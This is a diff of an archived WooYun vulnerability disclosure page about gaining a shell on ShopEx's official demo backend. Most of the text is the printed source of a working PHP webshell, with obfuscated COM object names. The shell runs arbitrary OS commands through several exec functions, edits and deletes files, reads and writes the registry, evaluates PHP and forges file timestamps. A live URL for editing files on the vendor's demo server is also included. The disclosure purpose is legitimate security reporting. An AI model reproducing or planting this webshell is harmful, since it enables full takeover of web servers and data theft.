+		if ($_POST[&#039;backuptype&#039;] == &#039;server&#039;) {<br />
+			@mysql_connect($servername,$dbusername,$dbpassword) or die(&quot;数据库连接失败&quot;);<br />
+			@mysql_select_db($dbname) or die(&quot;选择数据库失败&quot;);	<br />
+			$table = array_flip($_POST[&#039;table&#039;]);<br />
+			$filehandle = @fopen($path,&quot;w&quot;);<br />
+			if ($filehandle) {<br />
+				$result = mysql_query(&quot;SHOW tables&quot;);<br />
+				echo ($result) ? NULL : &quot;出错: &quot;.mysql_error();<br />
+				while ($currow = mysql_fetch_array($result)) {<br />
+					if (isset($table[$currow[0]])) {<br />
+						sqldumptable($currow[0], $filehandle);<br />
+						fwrite($filehandle,&quot;\n\n\n&quot;);<br />
+					}<br />
+				}<br />
+				fclose($filehandle);<br />
+				echo &quot;数据库已成功备份到 &lt;a href=\&quot;&quot;.$path.&quot;\&quot; target=\&quot;_blank\&quot;&gt;&quot;.$path.&quot;&lt;/a&gt;&quot;;<br />
+				mysql_close();<br />
+			} else {<br />
+				echo &quot;备份失败,请确认目标文件夹是否具有可写权限!&quot;;<br />
+			}<br />
+		}<br />
+	}<br />
+}<br />
+<br />
+<br />
+// 打包下载 PS:文件太大可能非常慢<br />
+// Thx : 小花<br />
+elseif($downrar) {<br />
+	if (!empty($dl)) {<br />
+		$dfiles=&quot;&quot;;<br />
+		foreach ($dl AS $filepath=&gt;$value) {<br />
+			$dfiles.=$filepath.&quot;,&quot;;<br />
+		}<br />
+		$dfiles=substr($dfiles,0,strlen($dfiles)-1);<br />
+		$dl=explode(&quot;,&quot;,$dfiles);<br />
+		$zip=new PHPZip($dl);<br />
+		$code=$zip-&gt;out;		<br />
+		header(&quot;Content-type: application/octet-stream&quot;);<br />
+		header(&quot;Accept-Ranges: bytes&quot;);<br />
+		header(&quot;Accept-Length: &quot;.strlen($code));<br />
+		header(&quot;Content-Disposition: attachment;filename=&quot;.$_SERVER[&#039;HTTP_HOST&#039;].&quot;_Files.tar.gz&quot;);<br />
+		echo $code;<br />
+		exit;<br />
+	} else {<br />
+		echo &quot;请选择要打包下载的文件!&quot;;<br />
+	}<br />
+}<br />
+<br />
+// Shell.Application 运行程序<br />
+elseif(($_POST[&#039;do&#039;] == &#039;programrun&#039;) AND !empty($_POST[&#039;program&#039;])) {<br />
+	$shell= &amp;new COM(&#039;Sh&#039;.&#039;el&#039;.&#039;l.Appl&#039;.&#039;ica&#039;.&#039;tion&#039;);<br />
+	$a = $shell-&gt;ShellExecute($_POST[&#039;program&#039;],$_POST[&#039;prog&#039;]);<br />
+	echo ($a==&#039;0&#039;) ? &quot;程序已经成功执行!&quot; : &quot;程序运行失败!&quot;;<br />
+}<br />
+<br />
+// 查看PHP配置参数状况<br />
+elseif(($_POST[&#039;do&#039;] == &#039;viewphpvar&#039;) AND !empty($_POST[&#039;phpvarname&#039;])) {<br />
+	echo &quot;配置参数 &quot;.$_POST[&#039;phpvarname&#039;].&quot; 检测结果: &quot;.getphpcfg($_POST[&#039;phpvarname&#039;]).&quot;&quot;;<br />
+}<br />
+<br />
+// 读取注册表<br />
+elseif(($regread) AND !empty($_POST[&#039;readregname&#039;])) {<br />
+	$shell= &amp;new COM(&#039;WSc&#039;.&#039;rip&#039;.&#039;t.Sh&#039;.&#039;ell&#039;);<br />
+	var_dump(@$shell-&gt;RegRead($_POST[&#039;readregname&#039;]));<br />
+}<br />
+<br />
+// 写入注册表<br />
+elseif(($regwrite) AND !empty($_POST[&#039;writeregname&#039;]) AND !empty($_POST[&#039;regtype&#039;]) AND !empty($_POST[&#039;regval&#039;])) {<br />
+	$shell= &amp;new COM(&#039;W&#039;.&#039;Scr&#039;.&#039;ipt.S&#039;.&#039;hell&#039;);<br />
+	$a = @$shell-&gt;RegWrite($_POST[&#039;writeregname&#039;], $_POST[&#039;regval&#039;], $_POST[&#039;regtype&#039;]);<br />
+	echo ($a==&#039;0&#039;) ? &quot;写入注册表健值成功!&quot; : &quot;写入 &quot;.$_POST[&#039;regname&#039;].&quot;, &quot;.$_POST[&#039;regval&#039;].&quot;, &quot;.$_POST[&#039;regtype&#039;].&quot; 失败!&quot;;<br />
+}<br />
+<br />
+// 删除注册表<br />
+elseif(($regdelete) AND !empty($_POST[&#039;delregname&#039;])) {<br />
+	$shell= &amp;new COM(&#039;WS&#039;.&#039;cri&#039;.&#039;pt.S&#039;.&#039;he&#039;.&#039;ll&#039;);<br />
+	$a = @$shell-&gt;RegDelete($_POST[&#039;delregname&#039;]);<br />
+	echo ($a==&#039;0&#039;) ? &quot;删除注册表健值成功!&quot; : &quot;删除 &quot;.$_POST[&#039;delregname&#039;].&quot; 失败!&quot;;<br />
+}<br />
+<br />
+<br />
+echo &quot;&lt;/b&gt;&lt;/p&gt;\n&quot;;<br />
+/*===================== 执行操作 结束 =====================*/<br />
+<br />
+if (!isset($_GET[&#039;action&#039;]) OR empty($_GET[&#039;action&#039;]) OR ($_GET[&#039;action&#039;] == &quot;dir&quot;)) {<br />
+	$tb-&gt;tableheader();<br />
+?&gt;<br />
+  &lt;tr bgcolor=&quot;#cccccc&quot;&gt;<br />
+    &lt;td align=&quot;center&quot; nowrap width=&quot;27%&quot;&gt;&lt;b&gt;文件&lt;/b&gt;&lt;/td&gt;<br />
+	&lt;td align=&quot;center&quot; nowrap width=&quot;16%&quot;&gt;&lt;b&gt;创建日期&lt;/b&gt;&lt;/td&gt;<br />
+    &lt;td align=&quot;center&quot; nowrap width=&quot;16%&quot;&gt;&lt;b&gt;最后修改&lt;/b&gt;&lt;/td&gt;<br />
+    &lt;td align=&quot;center&quot; nowrap width=&quot;11%&quot;&gt;&lt;b&gt;大小&lt;/b&gt;&lt;/td&gt;<br />
+    &lt;td align=&quot;center&quot; nowrap width=&quot;6%&quot;&gt;&lt;b&gt;属性&lt;/b&gt;&lt;/td&gt;<br />
+    &lt;td align=&quot;center&quot; nowrap width=&quot;24%&quot;&gt;&lt;b&gt;操作&lt;/b&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+&lt;?php<br />
+// 目录列表<br />
+$dirs=@opendir($dir);<br />
+$dir_i = &#039;0&#039;;<br />
+while ($file=@readdir($dirs)) {<br />
+	$filepath=&quot;$dir/$file&quot;;<br />
+	$a=@is_dir($filepath);<br />
+	if($a==&quot;1&quot;){<br />
+		if($file!=&quot;..&quot; &amp;&amp; $file!=&quot;.&quot;)	{<br />
+			$ctime=@date(&quot;Y-m-d H:i:s&quot;,@filectime($filepath));<br />
+			$mtime=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($filepath));<br />
+			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);<br />
+			echo &quot;&lt;tr class=&quot;.getrowbg().&quot;&gt;\n&quot;;<br />
+			echo &quot;  &lt;td style=\&quot;padding-left: 5px;\&quot;&gt;[&lt;a href=\&quot;?dir=&quot;.urlencode($dir).&quot;/&quot;.urlencode($file).&quot;\&quot;&gt;&lt;font color=\&quot;#006699\&quot;&gt;$file&lt;/font&gt;&lt;/a&gt;]&lt;/td&gt;\n&quot;;<br />
+			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$ctime&lt;/td&gt;\n&quot;;<br />
+			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$mtime&lt;/td&gt;\n&quot;;<br />
+			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;dir&gt;&lt;/td&gt;\n&quot;;<br />
+			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;a href=\&quot;?action=fileperm&amp;dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.urlencode($file).&quot;\&quot;&gt;$dirperm&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
+			echo &quot;  &lt;td align=\&quot;center\&quot; nowrap&gt;| &lt;a href=\&quot;#\&quot; onclick=\&quot;really(&#039;&quot;.urlencode($dir).&quot;&#039;,&#039;&quot;.urlencode($file).&quot;&#039;,&#039;你确定要删除 $file 目录吗? \\n\\n如果该目录非空,此次操作将会删除该目录下的所有文件!&#039;,&#039;1&#039;)\&quot;&gt;删除&lt;/a&gt; | &lt;a href=\&quot;?action=rename&amp;dir=&quot;.urlencode($dir).&quot;&amp;fname=&quot;.urlencode($file).&quot;\&quot;&gt;改名&lt;/a&gt; |&lt;/td&gt;\n&quot;;<br />
+			echo &quot;&lt;/tr&gt;\n&quot;;<br />
+			$dir_i++;<br />
+		} else {<br />
+			if($file==&quot;..&quot;) {<br />
+				echo &quot;&lt;tr class=&quot;.getrowbg().&quot;&gt;\n&quot;;<br />
+				echo &quot;  &lt;td nowrap colspan=\&quot;6\&quot; style=\&quot;padding-left: 5px;\&quot;&gt;&lt;a href=\&quot;?dir=&quot;.urlencode($dir).&quot;/&quot;.urlencode($file).&quot;\&quot;&gt;返回上级目录&lt;/a&gt;&quot;.$copyurl.$serveru.&quot;&amp;p=&quot;.$serverp.$copyurll.&quot;&lt;/td&gt;\n&quot;;<br />
+				echo &quot;&lt;/tr&gt;\n&quot;;<br />
+			}<br />
+		}<br />
+	}<br />
+}// while<br />
+@closedir($dirs); <br />
+?&gt;<br />
+&lt;tr bgcolor=&quot;#cccccc&quot;&gt;<br />
+  &lt;td colspan=&quot;6&quot; height=&quot;5&quot;&gt;&lt;/td&gt;<br />
+&lt;/tr&gt;<br />
+&lt;FORM action=&quot;&quot; method=&quot;POST&quot;&gt;<br />
+&lt;?<br />
+// 文件列表<br />
+$dirs=@opendir($dir);<br />
+$file_i = &#039;0&#039;;<br />
+while ($file=@readdir($dirs)) {<br />
+	$filepath=&quot;$dir/$file&quot;;<br />
+	$a=@is_dir($filepath);<br />
+	if($a==&quot;0&quot;){		<br />
+		$size=@filesize($filepath);<br />
+		$size=$size/1024 ;<br />
+		$size= @number_format($size, 3);<br />
+		if (@filectime($filepath) == @filemtime($filepath)) {<br />
+			$ctime=@date(&quot;Y-m-d H:i:s&quot;,@filectime($filepath));<br />
+			$mtime=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($filepath));<br />
+		} else {<br />
+			$ctime=&quot;&lt;span class=\&quot;redfont\&quot;&gt;&quot;.@date(&quot;Y-m-d H:i:s&quot;,@filectime($filepath)).&quot;&lt;/span&gt;&quot;;<br />
+			$mtime=&quot;&lt;span class=\&quot;redfont\&quot;&gt;&quot;.@date(&quot;Y-m-d H:i:s&quot;,@filemtime($filepath)).&quot;&lt;/span&gt;&quot;;<br />
+		}<br />
+		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);<br />
+		echo &quot;&lt;tr class=&quot;.getrowbg().&quot;&gt;\n&quot;;<br />
+		echo &quot;  &lt;td style=\&quot;padding-left: 5px;\&quot;&gt;&quot;;<br />
+		echo &quot;&lt;INPUT type=checkbox value=1 name=dl[$filepath]&gt;&quot;;<br />
+		echo &quot;&lt;a href=\&quot;$filepath\&quot; target=\&quot;_blank\&quot;&gt;$file&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
+		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$ctime&lt;/td&gt;\n&quot;;<br />
+		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;$mtime&lt;/td&gt;\n&quot;;<br />
+		echo &quot;  &lt;td align=\&quot;right\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;span class=\&quot;redfont\&quot;&gt;$size&lt;/span&gt; KB&lt;/td&gt;\n&quot;;<br />
+		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap class=\&quot;smlfont\&quot;&gt;&lt;a href=\&quot;?action=fileperm&amp;dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.urlencode($file).&quot;\&quot;&gt;$fileperm&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
+		echo &quot;  &lt;td align=\&quot;center\&quot; nowrap&gt;&lt;a href=\&quot;?downfile=&quot;.urlencode($filepath).&quot;\&quot;&gt;下载&lt;/a&gt; | &lt;a href=\&quot;?action=editfile&amp;dir=&quot;.urlencode($dir).&quot;&amp;editfile=&quot;.urlencode($file).&quot;\&quot;&gt;编辑&lt;/a&gt; | &lt;a href=\&quot;#\&quot; onclick=\&quot;really(&#039;&quot;.urlencode($dir).&quot;&#039;,&#039;&quot;.urlencode($filepath).&quot;&#039;,&#039;你确定要删除 $file 文件吗?&#039;,&#039;2&#039;)\&quot;&gt;删除&lt;/a&gt; | &lt;a href=\&quot;?action=rename&amp;dir=&quot;.urlencode($dir).&quot;&amp;fname=&quot;.urlencode($filepath).&quot;\&quot;&gt;改名&lt;/a&gt; | &lt;a href=\&quot;?action=newtime&amp;dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.urlencode($filepath).&quot;\&quot;&gt;时间&lt;/a&gt;&lt;/td&gt;\n&quot;;<br />
+		echo &quot;&lt;/tr&gt;\n&quot;;<br />
+		$file_i++;<br />
+	}<br />
+}// while<br />
+@closedir($dirs); <br />
+$tb-&gt;tdbody(&#039;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;2&quot; cellspacing=&quot;0&quot; align=&quot;center&quot;&gt;&lt;tr&gt;&lt;td&gt;&#039;.$tb-&gt;makeinput(&#039;chkall&#039;,&#039;on&#039;,&#039;onclick=&quot;CheckAll(this.form)&quot;&#039;,&#039;checkbox&#039;,&#039;30&#039;,&#039;&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;downrar&#039;,&#039;选中文件打包下载&#039;,&#039;&#039;,&#039;submit&#039;).&#039;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&#039;.$dir_i.&#039; 个目录 / &#039;.$file_i.&#039; 个文件&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#039;,&#039;center&#039;,getrowbg(),&#039;&#039;,&#039;&#039;,&#039;6&#039;);<br />
+<br />
+echo &quot;&lt;/FORM&gt;\n&quot;;<br />
+echo &quot;&lt;/table&gt;\n&quot;;<br />
+}// end dir<br />
+<br />
+elseif ($_GET[&#039;action&#039;] == &quot;editfile&quot;) {<br />
+	if(empty($newfile)) {<br />
+		$filename=&quot;$dir/$editfile&quot;;<br />
+		$fp=@fopen($filename,&quot;r&quot;);<br />
+		$contents=@fread($fp, filesize($filename));<br />
+		@fclose($fp);<br />
+		$contents=htmlspecialchars($contents);<br />
+	}else{<br />
+		$editfile=$newfile;<br />
+		$filename = &quot;$dir/$editfile&quot;;<br />
+	}<br />
+	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&amp;editfile=&quot;.$editfile;<br />
+	$tb-&gt;tableheader();<br />
+	$tb-&gt;formheader($action,&#039;新建/编辑文件&#039;);<br />
+	$tb-&gt;tdbody(&#039;当前文件: &#039;.$tb-&gt;makeinput(&#039;editfilename&#039;,$filename).&#039; 输入新文件名则建立新文件 Php代码加密: &lt;input type=&quot;checkbox&quot; name=&quot;change&quot; value=&quot;yes&quot; onclick=&quot;javascript:alert(\&#039;这个功能只可以用来加密或是压缩完整的php代码。\\n\\n非php代码或不完整php代码或不支持gzinflate函数请不要使用！\&#039;)&quot;&gt; &#039;);<br />
+	$tb-&gt;tdbody($tb-&gt;maketextarea(&#039;filecontent&#039;,$contents));<br />
+	$tb-&gt;makehidden(&#039;do&#039;,&#039;doeditfile&#039;);<br />
+	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
+}//end editfile<br />
+<br />
+elseif ($_GET[&#039;action&#039;] == &quot;rename&quot;) {<br />
+	$nowfile = (isset($_POST[&#039;newname&#039;])) ? $_POST[&#039;newname&#039;] : basename($_GET[&#039;fname&#039;]);<br />
+	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&amp;fname=&quot;.urlencode($fname);<br />
+	$tb-&gt;tableheader();<br />
+	$tb-&gt;formheader($action,&#039;修改文件名&#039;);<br />
+	$tb-&gt;makehidden(&#039;oldname&#039;,$dir.&quot;/&quot;.$nowfile);<br />
+	$tb-&gt;makehidden(&#039;dir&#039;,$dir);<br />
+	$tb-&gt;tdbody(&#039;当前文件名: &#039;.basename($nowfile));<br />
+	$tb-&gt;tdbody(&#039;改名为: &#039;.$tb-&gt;makeinput(&#039;newname&#039;));<br />
+	$tb-&gt;makehidden(&#039;do&#039;,&#039;rename&#039;);<br />
+	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
+}//end rename<br />
+<br />
+elseif ($_GET[&#039;action&#039;] == &quot;eval&quot;) {<br />
+	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&quot;;<br />
+	$tb-&gt;tableheader();<br />
+	$tb-&gt;formheader(&#039;&#039;.$action.&#039; &quot;target=&quot;_blank&#039; ,&#039;执行php脚本&#039;);<br />
+	$tb-&gt;tdbody($tb-&gt;maketextarea(&#039;phpcode&#039;,$contents));<br />
+	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
+	<br />
+}<br />
+elseif ($_GET[&#039;action&#039;] == &quot;fileperm&quot;) {<br />
+	$action = &quot;?dir=&quot;.urlencode($dir).&quot;&amp;file=&quot;.$file;<br />
+	$tb-&gt;tableheader();<br />
+	$tb-&gt;formheader($action,&#039;修改文件属性&#039;);<br />
+	$tb-&gt;tdbody(&#039;修改 &#039;.$file.&#039; 的属性为: &#039;.$tb-&gt;makeinput(&#039;fileperm&#039;,substr(base_convert(fileperms($dir.&#039;/&#039;.$file),10,8),-4)));<br />
+	$tb-&gt;makehidden(&#039;file&#039;,$file);<br />
+	$tb-&gt;makehidden(&#039;dir&#039;,urlencode($dir));<br />
+	$tb-&gt;makehidden(&#039;do&#039;,&#039;editfileperm&#039;);<br />
+	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
+}//end fileperm<br />
+<br />
+elseif ($_GET[&#039;action&#039;] == &quot;newtime&quot;) {<br />
+	$action = &quot;?dir=&quot;.urlencode($dir);<br />
+	$cachemonth = array(&#039;January&#039;=&gt;1,&#039;February&#039;=&gt;2,&#039;March&#039;=&gt;3,&#039;April&#039;=&gt;4,&#039;May&#039;=&gt;5,&#039;June&#039;=&gt;6,&#039;July&#039;=&gt;7,&#039;August&#039;=&gt;8,&#039;September&#039;=&gt;9,&#039;October&#039;=&gt;10,&#039;November&#039;=&gt;11,&#039;December&#039;=&gt;12);<br />
+	$tb-&gt;tableheader();<br />
+	$tb-&gt;formheader($action,&#039;克隆文件最后修改时间&#039;);<br />
+	$tb-&gt;tdbody(&quot;修改文件: &quot;.$tb-&gt;makeinput(&#039;curfile&#039;,$file,&#039;readonly&#039;).&quot; → 目标文件: &quot;.$tb-&gt;makeinput(&#039;tarfile&#039;,&#039;需填完整路径及文件名&#039;),&#039;center&#039;,&#039;2&#039;,&#039;30&#039;);<br />
+	$tb-&gt;makehidden(&#039;do&#039;,&#039;domodtime&#039;);<br />
+	$tb-&gt;formfooter(&#039;&#039;,&#039;30&#039;);<br />
+	$tb-&gt;formheader($action,&#039;自定义文件最后修改时间&#039;);<br />
+	$tb-&gt;tdbody(&#039;&lt;br&gt;&lt;ul&gt;&lt;li&gt;有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07&lt;br&gt;(该日期根据 32 位有符号整数的最小值和最大值而来)&lt;/li&gt;&lt;li&gt;说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!&lt;/li&gt;&lt;/ul&gt;&#039;,&#039;left&#039;);<br />
+	$tb-&gt;tdbody(&#039;当前文件名: &#039;.$file);<br />
+	$tb-&gt;makehidden(&#039;curfile&#039;,$file);<br />
+	$tb-&gt;tdbody(&#039;修改为: &#039;.$tb-&gt;makeinput(&#039;year&#039;,&#039;1984&#039;,&#039;&#039;,&#039;text&#039;,&#039;4&#039;).&#039; 年 &#039;.$tb-&gt;makeselect(array(&#039;name&#039;=&gt;&#039;month&#039;,&#039;option&#039;=&gt;$cachemonth,&#039;selected&#039;=&gt;&#039;October&#039;)).&#039; 月 &#039;.$tb-&gt;makeinput(&#039;data&#039;,&#039;18&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 日 &#039;.$tb-&gt;makeinput(&#039;hour&#039;,&#039;20&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 时 &#039;.$tb-&gt;makeinput(&#039;minute&#039;,&#039;00&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 分 &#039;.$tb-&gt;makeinput(&#039;second&#039;,&#039;00&#039;,&#039;&#039;,&#039;text&#039;,&#039;2&#039;).&#039; 秒&#039;,&#039;center&#039;,&#039;2&#039;,&#039;30&#039;);<br />
+	$tb-&gt;makehidden(&#039;do&#039;,&#039;modmytime&#039;);<br />
+	$tb-&gt;formfooter(&#039;1&#039;,&#039;30&#039;);<br />
+}//end newtime<br />
+<br />
+elseif ($_GET[&#039;action&#039;] == &quot;shell&quot;) {<br />
+	$action = &quot;??action=shell&amp;dir=&quot;.urlencode($dir);<br />
+	$tb-&gt;tableheader();<br />
+	$tb-&gt;tdheader(&#039;WebShell Mode&#039;);<br />
+  if (substr(PHP_OS, 0, 3) == &#039;WIN&#039;) {<br />
+		$program = isset($_POST[&#039;program&#039;]) ? $_POST[&#039;program&#039;] : &quot;c:\winnt\system32\cmd.exe&quot;;<br />
+		$prog = isset($_POST[&#039;prog&#039;]) ? $_POST[&#039;prog&#039;] : &quot;/c net start &gt; &quot;.$pathname.&quot;/log.txt&quot;;<br />
+		echo &quot;&lt;form action=\&quot;?action=shell&amp;dir=&quot;.urlencode($dir).&quot;\&quot; method=\&quot;POST\&quot;&gt;\n&quot;;<br />
+		$tb-&gt;tdbody(&#039;无回显运行程序 → 文件: &#039;.$tb-&gt;makeinput(&#039;program&#039;,$program).&#039; 参数: &#039;.$tb-&gt;makeinput(&#039;prog&#039;,$prog,&#039;&#039;,&#039;text&#039;,&#039;40&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;&#039;,&#039;Run&#039;,&#039;&#039;,&#039;submit&#039;),&#039;center&#039;,&#039;2&#039;,&#039;35&#039;);<br />
+		$tb-&gt;makehidden(&#039;do&#039;,&#039;programrun&#039;);<br />
+		echo &quot;&quot;.$copyurl.$serveru.&quot;&amp;p=&quot;.$serverp.$copyurll.&quot;&lt;/form&gt;\n&quot;;<br />
+	}<br />
+ echo &quot;&lt;form action=\&quot;?action=shell&amp;dir=&quot;.urlencode($dir).&quot;\&quot; method=\&quot;POST\&quot;&gt;\n&quot;;<br />
+ if(isset($_POST[&#039;cmd&#039;])) $cmd = $_POST[&#039;cmd&#039;];<br />
+	$tb-&gt;tdbody(&#039;提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容. &#039;);<br />
+	$tb-&gt;tdbody(&#039;proc_open函数假设不是默认的winnt系统请自行设置使用,自行修改记得写退出,否则会在主机上留下一个未结束的进程.&#039;);<br />
+	$tb-&gt;tdbody(&#039;proc_open函数要使用的cmd程序的位置:&#039;.$tb-&gt;makeinput(&#039;cmd&#039;,$cmd,&#039;&#039;,&#039;text&#039;,&#039;30&#039;).&#039;(要是是linux系统还是大大们自己修改吧)&#039;);<br />
+   $execfuncs = (substr(PHP_OS, 0, 3) == &#039;WIN&#039;) ? array(&#039;system&#039;=&gt;&#039;system&#039;,&#039;passthru&#039;=&gt;&#039;passthru&#039;,&#039;exec&#039;=&gt;&#039;exec&#039;,&#039;shell_exec&#039;=&gt;&#039;shell_exec&#039;,&#039;popen&#039;=&gt;&#039;popen&#039;,&#039;wscript&#039;=&gt;&#039;Wscript.Shell&#039;,&#039;proc_open&#039;=&gt;&#039;proc_open&#039;) : array(&#039;system&#039;=&gt;&#039;system&#039;,&#039;passthru&#039;=&gt;&#039;passthru&#039;,&#039;exec&#039;=&gt;&#039;exec&#039;,&#039;shell_exec&#039;=&gt;&#039;shell_exec&#039;,&#039;popen&#039;=&gt;&#039;popen&#039;,&#039;proc_open&#039;=&gt;&#039;proc_open&#039;);<br />
+   $tb-&gt;tdbody(&#039;选择执行函数: &#039;.$tb-&gt;makeselect(array(&#039;name&#039;=&gt;&#039;execfunc&#039;,&#039;option&#039;=&gt;$execfuncs,&#039;selected&#039;=&gt;$execfunc)).&#039; 输入命令: &#039;.$tb-&gt;makeinput(&#039;command&#039;,$_POST[&#039;command&#039;],&#039;&#039;,&#039;text&#039;,&#039;60&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;&#039;,&#039;Run&#039;,&#039;&#039;,&#039;submit&#039;));<br />
+?&gt;<br />
+  &lt;tr class=&quot;secondalt&quot;&gt;<br />
+    &lt;td align=&quot;center&quot;&gt;&lt;textarea name=&quot;textarea&quot; cols=&quot;100&quot; rows=&quot;25&quot; readonly&gt;&lt;?php<br />
+	if (!empty($_POST[&#039;command&#039;])) {<br />
+		if ($execfunc==&quot;system&quot;) {<br />
+			system($_POST[&#039;command&#039;]);<br />
+		} elseif ($execfunc==&quot;passthru&quot;) {<br />
+			passthru($_POST[&#039;command&#039;]);<br />
+		} elseif ($execfunc==&quot;exec&quot;) {<br />
+			$result = exec($_POST[&#039;command&#039;]);<br />
+			echo $result;<br />
+		} elseif ($execfunc==&quot;shell_exec&quot;) {<br />
+			$result=shell_exec($_POST[&#039;command&#039;]);<br />
+			echo $result;	<br />
+		} elseif ($execfunc==&quot;popen&quot;) {<br />
+			$pp = popen($_POST[&#039;command&#039;], &#039;r&#039;);<br />
+			$read = fread($pp, 2096);<br />
+			echo $read;<br />
+			pclose($pp);<br />
+		} elseif ($execfunc==&quot;wscript&quot;) {<br />
+			$wsh = new COM(&#039;W&#039;.&#039;Scr&#039;.&#039;ip&#039;.&#039;t.she&#039;.&#039;ll&#039;) or die(&quot;PHP Create COM WSHSHELL failed&quot;);<br />
+			$exec = $wsh-&gt;exec (&quot;cm&quot;.&quot;d.e&quot;.&quot;xe /c &quot;.$_POST[&#039;command&#039;].&quot;&quot;);<br />
+			$stdout = $exec-&gt;StdOut();<br />
+			$stroutput = $stdout-&gt;ReadAll();<br />
+			echo $stroutput;<br />
+		} elseif($execfunc==&quot;proc_open&quot;){<br />
+$descriptorspec = array(<br />
+   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),<br />
+   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),<br />
+   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)<br />
+);<br />
+$process = proc_open(&quot;&quot;.$_POST[&#039;cmd&#039;].&quot;&quot;, $descriptorspec, $pipes);<br />
+if (is_resource($process)) {<br />
+<br />
+    // 写命令<br />
+    fwrite($pipes[0], &quot;&quot;.$_POST[&#039;command&#039;].&quot;\r\n&quot;);<br />
+    fwrite($pipes[0], &quot;exit\r\n&quot;);<br />
+    fclose($pipes[0]);<br />
+    // 读取输出<br />
+    while (!feof($pipes[1])) {<br />
+        echo fgets($pipes[1], 1024);<br />
+    }<br />
+    fclose($pipes[1]);<br />
+    while (!feof($pipes[2])) {<br />
+        echo fgets($pipes[2], 1024);<br />
+      }<br />
+    fclose($pipes[2]);<br />
+<br />
+    proc_close($process);<br />
+}<br />
+		} else {<br />
+			system($_POST[&#039;command&#039;]);<br />
+		}<br />
+	}<br />
+?&gt;</code></pre></fieldset><p class='detail'><br />
+<br />
+<br />
+<br />
+在编辑文件的部分可以得到地址形式如下<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>$_POST[&#039;do&#039;] == &#039;doeditfile&#039;</code></pre></fieldset><p class='detail'><br />
+<br />
+查看本地shopex文件，构造如下地址：<br />
+<br />
+http://demo.shopex.com.cn/485app/sql.php?action=editfile&amp;dir=.%2F%2Fcore%2Finclude_v5&amp;editfile=setmgr.php<br />
+<br />
+顺利读取并可编辑保存。 </p>
+    </div>
+						
+			<h3 class="detailTitle">漏洞证明：</h3>
+      <div class='wybug_poc'>
+			<p class="detail"></p><p class="detail usemasaic"><a href="../upload/201212/03094543d3f4f49833db0b5d7f3cbae6c831c919.jpg" target="_blank"><img src="../upload/201212/03094543d3f4f49833db0b5d7f3cbae6c831c919.jpg" alt="485.jpg" width="600" onerror="javascript:errimg(this);"/></a></p><p class="detail"> </p>
+    </div>
+									<h3 class="detailTitle">修复方案：</h3>
+      <div class='wybug_patch'>
+			<p class="detail">权限，还是权限。。。 </p>
+    </div>
+													<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lucifer" title="lucifer">lucifer</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015536" title="shopex官方演示后台得到shell与任意文件遍历突破">乌云</a></h3>
+		<hr align="center"/>
+
+		
+			<h2 id="bugreply">漏洞回应</h2>
+      <div class='bug_result'>
+			
+				
+				
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-03 22:30</p>
+												<h3 class="detailTitle">厂商回复：</h3>
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+				      </div>
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15536";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
